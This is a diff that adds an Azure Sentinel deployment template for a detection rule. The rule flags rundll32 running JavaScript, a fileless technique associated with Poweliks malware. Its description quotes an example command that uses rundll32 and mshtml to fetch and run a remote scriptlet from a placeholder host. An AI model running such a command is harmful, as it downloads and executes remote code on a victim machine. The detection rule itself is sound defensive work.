@@ -1,0 +1,88 @@
+{
+    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
+    "contentVersion": "1.0.0.0",
+    "parameters": {
+        "workspace": {
+            "type": "String"
+        }
+    },
+    "resources": [
+        {
+            "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8a903ab9-d867-410a-a9e5-ce2484ec08e0')]",
+            "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8a903ab9-d867-410a-a9e5-ce2484ec08e0')]",
+            "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
+            "kind": "Scheduled",
+            "apiVersion": "2022-11-01-preview",
+            "properties": {
+                "displayName": "SHQ - Possible Malicious usage of Rundll32 by executing a JavaScript",
+                "description": "Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\\\"script:https[:]//www[.]example[.]com/malicious.sct\")\" This behavior has been seen used by malware such as Poweliks. Threat: Fileless malware such as Poweliks may use this to execute malicious Javascript files. False Positives: Printer installers and interfaces that use JavaScript, HTA and other questionable methods of presenting a native UI may trigger this query from time to time.",
+                "severity": "Medium",
+                "enabled": false,
+                "query": "DeviceProcessEvents\r\n| where InitiatingProcessFileName contains \"rundll32.exe\" and InitiatingProcessCommandLine contains \"javascript\"\r\n| project DeviceId, DeviceName, FileName, FolderPath, ProcessCommandLine",
+                "queryFrequency": "PT5M",
+                "queryPeriod": "PT5M",
+                "triggerOperator": "GreaterThan",
+                "triggerThreshold": 0,
+                "suppressionDuration": "PT5H",
+                "suppressionEnabled": false,
+                "startTimeUtc": null,
+                "tactics": [
+                    "CommandAndControl",
+                    "Execution"
+                ],
+                "techniques": [
+                    "T1559"
+                ],
+                "alertRuleTemplateName": null,
+                "incidentConfiguration": {
+                    "createIncident": true,
+                    "groupingConfiguration": {
+                        "enabled": false,
+                        "reopenClosedIncident": false,
+                        "lookbackDuration": "PT5H",
+                        "matchingMethod": "AllEntities",
+                        "groupByEntities": [],
+                        "groupByAlertDetails": [],
+                        "groupByCustomDetails": []
+                    }
+                },
+                "eventGroupingSettings": {
+                    "aggregationKind": "SingleAlert"
+                },
+                "alertDetailsOverride": null,
+                "customDetails": null,
+                "entityMappings": [
+                    {
+                        "entityType": "Host",
+                        "fieldMappings": [
+                            {
+                                "identifier": "FullName",
+                                "columnName": "DeviceId"
+                            }
+                        ]
+                    },
+                    {
+                        "entityType": "Process",
+                        "fieldMappings": [
+                            {
+                                "identifier": "CommandLine",
+                                "columnName": "ProcessCommandLine"
+                            }
+                        ]
+                    },
+                    {
+                        "entityType": "File",
+                        "fieldMappings": [
+                            {
+                                "identifier": "Name",
+                                "columnName": "FileName"
+                            }
+                        ]
+                    }
+                ],
+                "sentinelEntitiesMappings": null,
+                "templateVersion": null
+            }
+        }
+    ]
+}
